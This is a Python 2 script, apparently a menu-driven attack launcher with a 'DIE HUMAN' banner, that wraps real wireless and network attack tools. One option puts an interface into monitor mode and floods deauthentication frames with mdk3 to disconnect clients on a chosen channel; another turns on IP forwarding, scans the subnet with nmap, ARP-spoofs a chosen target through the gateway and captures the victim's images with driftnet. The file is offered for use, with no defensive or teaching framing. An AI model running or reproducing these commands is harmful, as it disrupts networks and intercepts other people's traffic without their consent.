#coding:utf-8
import os,time,threading
class colors:
	red="\033[31m" 	# 红色字 
	redw="\033[41;37m"#红底白字 
	off="\033[0m"
menu="""
--------------------------
	1|sniff cookie
--------------------------
	2|dis Ap
--------------------------
	3|sniff image
--------------------------

"""
logo=colors.red+"""
           ,                                                     '
         .n                 '                   '                 n.
  ,    .dP                dP                    9b                 9b.   '
 4     qXb        ,      dX                      Xb       ,        dXp    t
dX,     9Xb     .dXb    __                         __    dXb.     dXP    ,Xb
9XXb,_       _.dXXXXn dXXXXbo.                 .odXXXXb dXXXXb._      _,dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXX0o.           .o0XXXXXXXXVXXXXXXXXXXXXXXXXXXP
  9XXXXXXXXXXXXXXXXXXXXXX'~   ~`0008b   d8000'~   ~`XXXXXXXXXXXXXXXXXXXXP'
   `9XXXXXXXXXXXP' `9XX'    """+colors.redw+"""DIE"""+colors.off+colors.red+"""    `98V8P'   """+colors.redw+"""HUMAN"""+colors.off+colors.red+"""  `XXP' `9XXXXXXXXXXXP'
       ~~~~~~~       9x,           .db|db.          ,XP       ~~~~~~~
                       )b.  .dbo,dP'`v'`9b.odb.   .dX(
                      ,dXXXXXXXXXXb          dXXXXXXXXb.
                      dXXXXXXXXXP'     .     `9XXXXXXXXXb
                     dXXXXXXXXXXb     d|b     dXXXXXXXXXXb
                     9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                      `'      9XXXXXX(   )XXXXXXP      `'
                               XXXX X `V'.X XXXX
                               XP X'`b   d'`X XX
                               X. 9         P )X
                               `b  `       '  d'
                                `             '

"""+colors.off
def exe(c):
	os.system(c)
def sniffCookie():
	print colors.red+"Sorry,no open that mod;"+colors.off
def disap():
	i=raw_input(colors.redw+"Enter InterFace>"+colors.off)
	c="airmon-ng start "+str(i)
	os.system(c)
	os.system("airodump-ng wlan0mon")
	i=i+"mon"
	C=raw_input(colors.redw+"enter C>"+colors.off)
	c="mdk3 "+i+" d -c "+C+" -s 2000"
	time.sleep(0.5)
	print c
	os.system(c)
	c="airmon-ng stop "+i
	os.system(c)
def sniffimage():
	os.system("echo 1 >/proc/sys/net/ipv4/ip_forward")
	os.system("route -n")
	route=raw_input(colors.redw+"Enter routeIP>"+colors.off)
	c="nmap -sS "+str(route)+"/24"
	os.system(c)
	target=raw_input(colors.redw+"Enter Target IP>"+colors.off)
	i=raw_input(colors.redw+"Enter interface>"+colors.off)
	c1="arpspoof -i "+i+" -t "+route+" "+target
	c2="driftnet -i "+i
	t1=threading.Thread(target=exe,args=(c1,))
	os.system(c2)
        t1.start()
def mod():
	print menu
	choose=raw_input(colors.redw+"EnterChoose>"+colors.off)
	if choose=="1":
		sniffCookie()
	elif choose=="2":
		disap()
	elif choose=="3":
		sniffimage()
	else:
		print "Error;no found!"
		if choose=="exit":
			exit()
		else:
			return mod()
	if choose!="exit":
		return mod()
def mian():
	time.sleep(0.5)
	print logo
	time.sleep(0.5)
	print "[+]............OK"
	try:
		mod()
	except:
		time.sleep(0.5)
		print "[+]............STOP Done!"

if __name__=="__main__":
	try:
	    mian()
	except:
		os.system("airmon-ng stop wlan0mon 2>/etc/null")
